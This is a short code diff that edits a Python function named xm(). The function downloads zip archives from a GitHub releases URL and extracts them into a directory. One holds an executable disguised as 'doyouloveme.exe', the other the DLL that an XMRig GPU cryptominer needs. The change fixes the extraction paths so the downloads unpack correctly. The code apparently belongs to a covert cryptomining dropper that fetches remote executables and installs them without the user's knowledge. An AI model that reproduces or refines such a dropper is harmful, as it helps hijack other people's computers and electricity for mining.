@@ -32,7 +32,7 @@ def xm():
       
    if not os.path.exists(xmpath + 'doyouloveme.exe'):
       urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/doyouloveme.zip", "{}/doyouloveme.zip".format(xmpath))
-      with zipfile.ZipFile("doyouloveme.zip", 'r') as zip_ref:
+      with zipfile.ZipFile("{}/doyouloveme.zip".format(xmpath), 'r') as zip_ref:
          zip_ref.extractall(xmpath)
       time.sleep(3)
       os.remove("{}/doyouloveme.zip".format(xmpath))
@@ -46,7 +46,7 @@ def xm():
          
       if not os.path.exists(xmpath + 'xmrig-cuda.dll'):
          urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/cuda.zip", "{}/cuda.zip".format(xmpath))
-         with zipfile.ZipFile("cuda.zip", 'r') as zip_ref:
+         with zipfile.ZipFile("{}/cuda.zip".format(xmpath), 'r') as zip_ref:
             zip_ref.extractall(xmpath)
          time.sleep(3)
          os.remove("{}/cuda.zip".format(xmpath))
